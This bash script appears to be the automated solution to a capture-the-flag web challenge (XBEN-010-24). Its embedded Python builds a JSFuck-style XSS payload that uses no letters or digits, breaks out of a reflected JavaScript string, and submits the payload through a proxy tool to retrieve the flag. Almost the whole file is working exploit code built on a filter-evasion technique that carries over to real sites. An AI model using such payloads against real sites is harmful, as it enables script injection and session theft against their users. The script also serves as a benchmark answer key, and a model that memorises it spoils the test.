#!/usr/bin/env bash
# XBEN-010-24 — XSS with no letters or digits. Proxy-mode twin. The payload is
# built entirely from [](){}+! (JSFuck-style), reconstructing alert/unescape and
# the string "XSS" from coercions. It is spliced into a JS string the page
# reflects; the server returns the flag when it would execute.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben010p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/page"
BASE="$(req_of GET page)"; [ -n "$BASE" ] || BASE="$(req_of GET /)"
payload="$(python3 - <<'PY'
def num(k):
    if k == 0:
        return "+[]"
    if k == 1:
        return "+!+[]"
    return "+".join(["!+[]"] * k)

def numstr(k):
    return "(" + num(k) + "+[])"

def at(expr, k):
    return expr + "[" + num(k) + "]"

FALSE = "(![]+[])"        # "false"
TRUE = "(!![]+[])"        # "true"
UNDEF = "([][[]]+[])"     # "undefined"
OBJ = "([]+{})"           # "[object Object]"

ch = {
    "f": at(FALSE, 0), "a": at(FALSE, 1), "l": at(FALSE, 2),
    "s": at(FALSE, 3), "e": at(FALSE, 4),
    "t": at(TRUE, 0), "r": at(TRUE, 1), "u": at(TRUE, 2),
    "n": at(UNDEF, 1), "d": at(UNDEF, 2), "i": at(UNDEF, 5),
    "o": at(OBJ, 1), "b": at(OBJ, 2), "j": at(OBJ, 3),
    "c": at(OBJ, 5), " ": at(OBJ, 7),
}

def word(text):
    return "+".join(ch[c] for c in text)

FUNCTION = "[][" + word("filter") + "][" + word("constructor") + "]"

# `<font color="undefined">false</font>`: the only `/` within reach.
TAG = FALSE + "[" + word("fontcolor") + "]()"
SLASH = at(TAG, 30)

# A regular expression built only so its constructor can be named:
# "function RegExp() { [native code] }" is where the `p` comes from.
REGEX = FUNCTION + "(" + word("return") + "+" + SLASH + "+" + FALSE + "+" + SLASH + ")()"
REGEXP_NAME = "(" + REGEX + "[" + word("constructor") + "]+[])"
ch["p"] = at(REGEXP_NAME, 14)

def call(name):
    return FUNCTION + "(" + word("return ") + "+" + word(name) + ")()"

PERCENT = at(call("escape") + "(" + ch[" "] + ")", 0)
XSS = "+".join([PERCENT, numstr(5), numstr(8),
                PERCENT, numstr(5), numstr(3),
                PERCENT, numstr(5), numstr(3)])

# Close the string the server opened, then run, then comment out its remains.
print('";' + call("alert") + "(" + call("unescape") + "(" + XSS + "))" + "//")
PY
)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=POST' --set 'path=/page' --set "form.name=$payload" >/dev/null
print_flag
